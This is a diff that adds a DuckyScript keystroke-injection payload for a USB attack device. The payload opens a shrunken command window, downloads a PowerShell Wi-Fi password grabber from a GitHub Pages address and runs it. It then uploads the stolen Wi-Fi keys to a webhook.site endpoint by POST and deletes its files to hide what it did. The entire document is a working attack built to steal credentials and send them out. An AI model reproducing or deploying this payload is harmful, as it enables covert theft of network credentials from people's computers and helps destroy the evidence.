@@ -1,0 +1,31 @@
+DELAY 500
+GUI r
+DELAY 200
+STRING cmd /k mode con: cols=15 lines=1
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd %temp%
+DELAY 500
+ENTER
+DELAY 2000
+STRING curl https://oceanofanythingofficial.github.io/Wi-Fi-Password-Grabber-With-Online-Upload-Facility-With-Ducky-Script-Batch-Script-vbs-Script/Powershell-Script -o Wi-Fi.ps1
+DELAY 1000
+ENTER
+STRING powershell -File Wi-Fi.ps1
+DELAY 1000
+ENTER
+DELAY 2000
+STRING type Wi-Fi.log > Wi-Fi.key
+DELAY 1000
+ENTER
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/c8e42212-e64b-4bbe-8452-8b8dd92ee43a -Method POST -InFile Wi-Fi.key > Wi-Fi.log
+DELAY 1000
+ENTER
+DELAY 2000
+STRING del Wi* /s/f/q
+DELAY 500
+ENTER
+STRING exit
+DELAY 500
+ENTER
